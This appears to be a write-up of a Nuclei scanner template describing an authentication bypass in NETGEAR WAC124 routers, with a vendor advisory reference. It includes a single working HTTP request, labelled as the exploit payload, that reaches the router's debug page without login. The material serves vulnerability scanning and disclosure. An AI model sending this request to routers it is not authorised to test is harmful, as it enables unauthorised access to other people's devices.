# Nuclei Template: NETGEAR WAC124 - Authentication Bypass
**Template ID:** netgear-wac124-router-auth-bypass
**Vulnerability Class:** Improper Authentication - Generic
**Severity:** High
**CWE:** CWE-287
**Source:** Nuclei Template (`netgear-wac124-router-auth-bypass.yaml`)

## Vulnerability Information & PoC

## Description
NETGEAR WAC124 AC2000 routers contain an authentication bypass vulnerability. An attacker can gain access by bypassing proper authentication, thereby making it possible to obtain sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/setup.cgi?next_file=debug.htm&x=currentsetting.htm
```

## References
- https://flattsecurity.medium.com/finding-bugs-to-trigger-unauthenticated-command-injection-in-a-netgear-router-psv-2022-0044-2b394fb9edc
- https://kb.netgear.com/000064730/Security-Advisory-for-Multiple-Vulnerabilities-on-the-WAC124-PSV-2022-0044
